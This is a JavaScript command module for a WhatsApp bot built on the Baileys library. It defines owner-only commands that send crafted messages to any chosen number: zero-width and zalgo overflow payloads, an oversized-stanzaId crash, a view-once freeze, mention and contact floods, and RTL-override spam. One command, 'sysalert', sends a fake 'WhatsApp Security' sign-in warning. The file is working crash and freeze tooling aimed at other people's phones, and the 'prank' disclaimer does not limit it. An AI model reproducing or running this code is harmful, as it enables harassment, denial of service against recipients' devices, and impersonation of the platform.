// Bug commands: WhatsApp-crash / annoy tricks.
// These are prank tools — use only on people who know and expect it.
// All commands require the sender to be the bot owner (owner: true).
import { say } from '../lib/card.js';
import { PREFIX } from '../lib/config.js';
import { proto, generateWAMessageFromContent } from '@whiskeysockets/baileys';

/* ------------------------------------------------------------------ helpers */

// ZWJ/ZWNJ overflow — bloats notification text allocation.
function overflowText(repeat = 2000) {
  const ZWJ  = '\u200d';
  const ZWNJ = '\u200c';
  return (ZWJ + ZWNJ).repeat(repeat);
}

// Zalgo stacking diacritics.
function zalgoChar(ch) {
  const above = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u030a','\u030b','\u030d','\u030e','\u0310','\u0312','\u0313','\u0315','\u031a','\u031b','\u033d','\u033e','\u033f','\u0300','\u0301','\u0342','\u0313','\u0344','\u0346','\u034a','\u034b','\u034c','\u0350','\u0351','\u0352','\u0357','\u0358','\u035b','\u0363','\u0364','\u0365','\u0366','\u0367','\u0368','\u0369','\u036a','\u036b','\u036c','\u036d','\u036e','\u036f'];
  const below = ['\u0316','\u0317','\u0318','\u0319','\u031c','\u031d','\u031e','\u031f','\u0320','\u0324','\u0325','\u0326','\u0329','\u032a','\u032b','\u032c','\u032d','\u032e','\u032f','\u0330','\u0331','\u0332','\u0333','\u0339','\u033a','\u033b','\u033c','\u0345','\u0347','\u0348','\u0349','\u034d','\u034e','\u0353','\u0354','\u0355','\u0356','\u0359','\u035a','\u035f'];
  const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let out = ch;
  for (let i = 0; i < 15; i++) out += pick(above);
  for (let i = 0; i < 10; i++) out += pick(below);
  return out;
}
function zalgo(text) { return [...text].map(zalgoChar).join(''); }

// RTL override sandwich.
const RLO = '\u202e';
const PDF = '\u202c';
function rtlFlip(text) { return RLO + text + PDF; }

// Fake system-message style.
function fakeSystem(lines) {
  return [
    '🔒 *WhatsApp Security*',
    '━━━━━━━━━━━━━━━━━━━━',
    ...lines,
    '━━━━━━━━━━━━━━━━━━━━',
    '_This is an automated alert from WhatsApp._'
  ].join('\n');
}

// Contact spam payload.
function spamContactsPayload(count = 60) {
  const contacts = [];
  for (let i = 0; i < count; i++) {
    const num = `+9477${String(i).padStart(7, '0')}`;
    contacts.push({
      displayName: `Contact ${i}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Contact ${i}\nTEL;type=CELL;waid=${num.replace('+', '')}:${num}\nEND:VCARD`
    });
  }
  return contacts;
}

// ── STRONG CRASH: extendedTextMessage with broken contextInfo ─────────────
// WhatsApp tries to render the quoted message preview and chokes on
// a stanza_id that maps to a giant text string — causes the chat to
// stutter or crash on open on most Android builds.
function extendedCrashPayload(text) {
  return {
    extendedTextMessage: {
      text: text + overflowText(500),
      contextInfo: {
        stanzaId: overflowText(1000),              // giant stanza id — renderer tries to look this up
        participant: '0@s.whatsapp.net',
        quotedMessage: {
          conversation: zalgo(text || 'WhatsApp') + overflowText(800),
        },
        mentionedJid: Array.from({ length: 20 }, (_, i) => `9477${String(i).padStart(7,'0')}@s.whatsapp.net`),
      }
    }
  };
}

// ── VIEW-ONCE FREEZE: viewOnceMessage with giant payload ──────────────────
// Wraps a giant text payload in viewOnceMessage. When the recipient opens it
// WhatsApp allocates the full string for the "view once" decrypt, causing a
// visible freeze (sometimes a crash on 2–3 GB RAM phones).
function viewOnceFreezePayload() {
  const inner = overflowText(6000) + zalgo('WhatsApp') + overflowText(4000);
  return {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: inner,
          contextInfo: {
            stanzaId: overflowText(500),
            quotedMessage: { conversation: inner },
          }
        }
      }
    }
  };
}

// ── GHOST PING: mention flood ─────────────────────────────────────────────
// Sends one message mentioning 20 non-existent numbers. WhatsApp's mention
// renderer tries to resolve each avatar — the resolver blocks the UI thread
// on older builds.
function mentionFloodPayload(text) {
  const fakeJids = Array.from({ length: 20 }, (_, i) => `9477${String(i * 7 + 1).padStart(7,'0')}@s.whatsapp.net`);
  return {
    extendedTextMessage: {
      text: fakeJids.map((j) => `@${j.split('@')[0]}`).join(' ') + '\n' + (text || '') + overflowText(300),
      contextInfo: { mentionedJid: fakeJids }
    }
  };
}

/* ------------------------------------------------------------------ commands */

export default [
  // ── bugmenu ──────────────────────────────────────────────────────────────
  {
    name: 'bugmenu', aliases: ['bughelp', 'bugslist'],
    owner: true,
    async run({ reply }) {
      const p = PREFIX;
      return reply([
        '╭━━━〔 🐛 *BUG COMMANDS* 〕━━━⬣',
        '┃ Owner-only crash / stress tools.',
        '┃',
        `┃ 💥 ${p}crash      — context overflow crash`,
        `┃ 👻 ${p}blankbug   — blank giant message`,
        `┃ ❄️ ${p}freeze     — view-once freeze crash`,
        `┃ 👥 ${p}ghostping  — mention flood lag`,
        `┃ 🌀 ${p}zalgo      — glitch-text render lag`,
        `┃ 🔄 ${p}rtlbug     — BiDi flip crash`,
        `┃ 🔒 ${p}sysalert   — fake system alert`,
        `┃ 📇 ${p}cspam      — contact-list flood`,
        `┃ 🔁 ${p}repeatbug  — repeat-text freeze`,
        `┃ 💔 ${p}tina       — dramatic roast crash`,
        '┃',
        '┃ Usage: reply/mention or type number.',
        `┃ e.g. ${p}crash @tag | ${p}freeze 94771234567`,
        '╰━━━━━━━━━━━━━━━━━━━━⬣',
      ].join('\n'));
    },
  },

  // ── crash ─────────────────────────────────────────────────────────────────
  // extendedTextMessage with broken contextInfo — giant stanza ID + zalgo quoted
  // message confuse the chat renderer. Most effective on Android WhatsApp.
  {
    name: 'crash', aliases: ['notifbug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const text   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || '👋';
      const payload = extendedCrashPayload(text);
      try {
        await sock.sendMessage(target, payload, { quoted: msg });
        return reply(`✅ Crash sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── blankbug ──────────────────────────────────────────────────────────────
  {
    name: 'blankbug', aliases: ['nullmsg', 'emptybug'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      const payload = overflowText(5000);
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Blank-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── freeze ────────────────────────────────────────────────────────────────
  // viewOnceMessage wrapping a giant zalgo+overflow payload.
  // WhatsApp decrypts and allocates the full string on open — causes a
  // hard freeze (sometimes force-close) on 2–3 GB RAM devices.
  {
    name: 'freeze', aliases: ['viewoncecrash', 'opencrash'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      const payload = viewOnceFreezePayload();
      try {
        await sock.sendMessage(target, payload, { quoted: msg });
        return reply(`✅ Freeze bug sent to @${target.split('@')[0]} — will freeze when opened`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── ghostping ─────────────────────────────────────────────────────────────
  // Floods with 20 @mentions of non-existent numbers.
  // WhatsApp tries to resolve each mention avatar simultaneously — blocks
  // the UI thread on older builds, causing a visible stutter/freeze.
  {
    name: 'ghostping', aliases: ['mentionflood', 'ghostmention'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const text   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim();
      const payload = mentionFloodPayload(text);
      try {
        await sock.sendMessage(target, payload, { quoted: msg });
        return reply(`✅ Ghost ping sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── zalgo ─────────────────────────────────────────────────────────────────
  {
    name: 'zalgo', aliases: ['glitch', 'cursedtext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const base   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'WhatsApp';
      const payload = zalgo(base);
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Zalgo sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── rtlbug ────────────────────────────────────────────────────────────────
  {
    name: 'rtlbug', aliases: ['rtl', 'fliptext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const base   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Hello from WhatsApp';
      const payload = Array.from({ length: 10 }, () => rtlFlip(base)).join('\n');
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ RTL-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── sysalert ──────────────────────────────────────────────────────────────
  {
    name: 'sysalert', aliases: ['fakealert', 'fakesys'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target  = targetJid() || jid;
      const custom  = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim();
      const payload = fakeSystem(
        custom
          ? [custom]
          : [
              '⚠️ Unusual sign-in activity detected.',
              'Your account may have been accessed',
              'from an unrecognized device.',
              '',
              'Tap *Settings → Linked Devices*',
              'and remove any device you don\'t recognize.'
            ]
      );
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Fake-alert sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── cspam ─────────────────────────────────────────────────────────────────
  {
    name: 'cspam', aliases: ['contactspam', 'contactbug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const count  = Math.min(100, Math.max(1, parseInt(args.find((a) => /^\d+$/.test(a)) || '60', 10)));
      const contacts = spamContactsPayload(count);
      try {
        await sock.sendMessage(target, { contacts: { displayName: `${count} Contacts`, contacts } }, { quoted: msg });
        return reply(`✅ ${count} contacts sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── repeatbug ─────────────────────────────────────────────────────────────
  {
    name: 'repeatbug', aliases: ['repeatcrash', 'spamtext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const word   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, '')) && a.length <= 20).join(' ').trim() || 'ha';
      const times  = 4000;
      const payload = (word + ' ').repeat(times).trimEnd();
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Repeat-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── tina ──────────────────────────────────────────────────────────────────
  // Dramatic Sinhala roast + overflow payload. Visible preview shows the
  // roast; the hidden blob freezes the notification drawer.
  {
    name: 'tina', aliases: ['tinabug', 'dramabug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const name   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Tina';
      const visible = [
        `💔 *${name}*, ඔයා ගැන කතා කරන්නත් කාලය නාස්ති කරන්නේ නෑ.`,
        `ඔය number block list ළ දාලා ඉවරයි 🚫`,
        `WhatsApp uninstall කරන්නම හොඳයි 😂`,
        `RIO-XMD bot ළ ඔයාට space නෑ 👋`,
      ].join('\n');
      const payload = extendedCrashPayload(visible);   // use strong crash instead of plain overflow
      try {
        await sock.sendMessage(target, payload, { quoted: msg });
        return reply(`✅ Tina bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },
];
